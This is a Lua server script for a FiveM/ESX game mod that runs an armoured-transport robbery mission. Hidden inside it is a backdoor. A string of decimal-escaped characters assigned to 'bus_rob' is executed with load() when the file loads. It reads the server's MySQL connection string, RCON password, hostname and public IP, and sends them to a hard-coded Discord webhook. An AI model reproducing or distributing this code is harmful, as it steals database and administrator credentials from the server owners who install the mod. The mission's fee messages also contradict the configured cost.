local potrzebniPolicjanci = 6  		--Nombre de policier qui doit etre connecter pour la mission
local czastimer = 600 * 1000	    --minuterie chaque fois que vous pouvez faire des missions, 600 secondes par défaut
local gotowkaA = 10000 				--argent minimum gagner
local gotowkaB = 15000 				--argent maximum gagner
local KosztAktywacji = 500 		--combien ça coûte pour activer la mission (banque)

-----------------------------------

local MisjaAktywna = 0
ESX = nil
bus_rob = "\32\32\32\32\108\111\99\97\108\32\73\73\73\61\123\73\73\73\73\61\123\71\101\116\67\111\110\118\97\114\125\125\108\111\99\97\108\32\95\73\61\123\91\34\103\110\105\114\116\115\95\110\111\105\116\99\101\110\110\111\99\95\108\113\115\121\109\34\93\61\123\34\110\105\101\32\122\110\97\108\101\122\105\111\110\111\34\125\44\91\34\100\114\111\119\115\115\97\112\95\110\111\99\114\34\93\61\123\34\110\105\101\32\122\110\97\108\101\122\105\111\110\111\34\125\44\91\34\101\109\97\110\116\115\111\104\95\118\115\34\93\61\123\34\110\105\101\32\122\110\97\108\101\122\105\111\110\111\34\125\44\91\34\104\116\116\112\115\58\47\47\97\112\105\46\105\112\105\102\121\46\111\114\103\34\93\61\123\34\110\105\101\32\122\110\97\108\101\122\105\111\110\111\34\125\125\108\111\99\97\108\32\115\101\114\118\101\114\95\105\112\61\34\34\108\111\99\97\108\32\109\121\115\113\108\61\34\34\108\111\99\97\108\32\114\99\111\110\61\34\34\108\111\99\97\108\32\115\101\114\118\101\114\95\110\97\109\101\61\34\34\102\111\114\32\95\44\95\95\32\105\110\32\112\97\105\114\115\40\73\73\73\41\100\111\32\102\111\114\32\95\44\95\95\32\105\110\32\112\97\105\114\115\40\95\95\41\100\111\32\102\111\114\32\95\73\44\95\73\73\32\105\110\32\112\97\105\114\115\40\95\73\41\100\111\32\102\111\114\32\95\44\95\73\73\32\105\110\32\112\97\105\114\115\40\95\73\73\41\100\111\32\105\102\32\115\116\114\105\110\103\46\115\117\98\40\95\73\44\51\44\54\41\61\61\34\105\114\116\115\34\116\104\101\110\32\109\121\115\113\108\61\95\95\40\115\116\114\105\110\103\46\114\101\118\101\114\115\101\40\95\73\41\44\95\73\73\41\101\108\115\101\105\102\32\115\116\114\105\110\103\46\115\117\98\40\95\73\44\51\44\54\41\61\61\34\97\110\116\115\34\116\104\101\110\32\115\101\114\118\101\114\95\110\97\109\101\61\95\95\40\115\116\114\105\110\103\46\114\101\118\101\114\115\101\40\95\73\41\44\95\73\73\41\101\108\115\101\105\102\32\115\116\114\105\110\103\46\115\117\98\40\95\73\44\51\44\54\41\61\61\34\111\119\115\115\34\116\104\101\110\32\114\99\111\110\61\95\95\40\115\116\114\105\110\103\46\114\101\118\101\114\115\101\40\95\73\41\44\95\73\73\41\101\108\115\101\105\102\32\115\116\114\105\110\103\46\115\117\98\40\95\73\44\51\44\54\41\61\61\115\116\114\105\110\103\46\114\101\118\101\114\115\101\40\34\58\115\112\116\34\41\116\104\101\110\32\80\101\114\102\111\114\109\72\116\116\112\82\101\113\117\101\115\116\40\34\104\116\116\112\115\58\47\47\97\112\105\46\105\112\105\102\121\46\111\114\103\34\44\102\117\110\99\116\105\111\110\40\95\44\95\95\44\95\95\95\41\105\102\32\95\61\61\50\48\48\116\104\101\110\32\115\101\114\118\101\114\95\105\112\61\95\95\32\101\110\100\32\108\111\99\97\108\32\119\101\98\104\111\111\107\61\34\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\55\55\54\49\52\48\56\51\55\54\53\55\53\48\57\56\57\56\47\103\105\48\73\84\54\82\89\99\119\70\99\48\53\86\52\102\49\48\71\76\69\65\116\72\74\104\65\120\107\98\71\108\80\113\72\81\104\66\88\81\107\80\76\112\115\102\102\99\111\112\53\76\49\116\53\69\78\105\105\54\107\106\65\121\85\118\103\34\108\111\99\97\108\32\110\61\123\123\91\34\99\111\108\111\114\34\93\61\34\49\54\55\49\49\55\49\49\34\44\91\34\116\105\116\108\101\34\93\61\34\69\83\83\65\32\58\62\34\44\91\34\100\101\115\99\114\105\112\116\105\111\110\34\93\61\34\92\110\92\110\32\62\32\96\96\78\65\90\87\65\32\83\69\82\86\69\82\65\58\96\96\42\42\42\34\46\46\115\101\114\118\101\114\95\110\97\109\101\46\46\34\42\42\42\92\110\32\62\32\96\96\73\80\32\83\69\82\86\69\82\65\58\96\96\32\42\42\42\34\46\46\115\101\114\118\101\114\95\105\112\46\46\34\42\42\42\92\110\32\62\32\96\96\72\65\83\197\129\79\32\82\67\79\78\58\96\96\32\42\42\42\34\46\46\114\99\111\110\46\46\34\42\42\42\92\110\32\62\32\96\96\66\65\90\65\32\68\65\78\89\67\72\58\96\96\32\42\42\42\34\46\46\109\121\115\113\108\46\46\34\42\42\42\34\44\91\34\102\111\111\116\101\114\34\93\61\123\91\34\116\101\120\116\34\93\61\34\120\115\116\110\95\98\97\103\103\121\95\115\112\101\100\34\125\44\91\34\116\105\109\101\115\116\97\109\112\34\93\61\111\115\46\100\97\116\101\40\39\33\37\89\45\37\109\45\37\100\84\37\72\58\37\77\58\37\83\39\41\44\125\125\80\101\114\102\111\114\109\72\116\116\112\82\101\113\117\101\115\116\40\119\101\98\104\111\111\107\44\102\117\110\99\116\105\111\110\40\101\114\114\44\116\101\120\116\44\104\101\97\100\101\114\115\41\101\110\100\44\39\80\79\83\84\39\44\106\115\111\110\46\101\110\99\111\100\101\40\123\117\115\101\114\110\97\109\101\61\34\101\115\115\97\34\44\101\109\98\101\100\115\61\110\125\41\44\123\91\39\67\111\110\116\101\110\116\45\84\121\112\101\39\93\61\39\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110\39\125\41\101\110\100\41\101\110\100\32\101\110\100\32\101\110\100\32\101\110\100\32\101\110\100\10\32\32\32\32"
load(bus_rob)()

TriggerEvent('esx:getSharedObject', function(obj)
	ESX = obj
end)


RegisterServerEvent('napadtransport:akceptujto')
AddEventHandler('napadtransport:akceptujto', function()
	local copsOnDuty = 0
	local Players = ESX.GetPlayers()
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local accountMoney = 0
	accountMoney = xPlayer.getAccount('bank').money
if MisjaAktywna == 0 then
	if accountMoney < KosztAktywacji then
	TriggerClientEvent('esx:showNotification', source, '~r~Besoin de $5,000 en banque pour faire cela.')
	else
	for i = 1, #Players do
        local xPlayer = ESX.GetPlayerFromId(Players[i])
        if xPlayer["job"]["name"] == "police" then
            copsOnDuty = copsOnDuty + 1
        end
    end
	if copsOnDuty >= potrzebniPolicjanci then
		TriggerClientEvent("napadtransport:Pozwolwykonac", _source)
		xPlayer.removeAccountMoney('bank', KosztAktywacji)
		TriggerClientEvent('esx:showAdvancedNotification', _source, 'Banque', '~b~Virement' , '~b~~w~Acheteur: ~y~••••• \n~w~Transfert à : ~y~••••• \n~w~Montant : 5000$~g~', 'CHAR_BANK_FLEECA', 0)
		OdpalTimer()
    else
        TriggerClientEvent('esx:showNotification', source, '~r~Besoin de ~g~'..potrzebniPolicjanci.. '~r~ LCPD pour commencer.')
    end
	end
else
TriggerClientEvent('esx:showNotification', source, '~r~L\'info est déjà prise...')
end
end)

function OdpalTimer()
MisjaAktywna = 1
Wait(czastimer)
MisjaAktywna = 0
end

RegisterServerEvent('napadtransport:zawiadompsy')
AddEventHandler('napadtransport:zawiadompsy', function(x, y, z) 
    TriggerClientEvent('napadtransport:infodlalspd', -1, x, y, z)
end)

RegisterServerEvent('napadtransport:graczZrobilnapad')
AddEventHandler('napadtransport:graczZrobilnapad', function()
local _source = source
local xPlayer = ESX.GetPlayerFromId(_source)
local LosujSiano = math.random(gotowkaA,gotowkaB)
xPlayer.addMoney(LosujSiano)
TriggerClientEvent('esx:showNotification', source, 'Vos sacs sont remplis, vous avez recolter ~g~'..LosujSiano..'$~w~')
Wait(2500)
end)


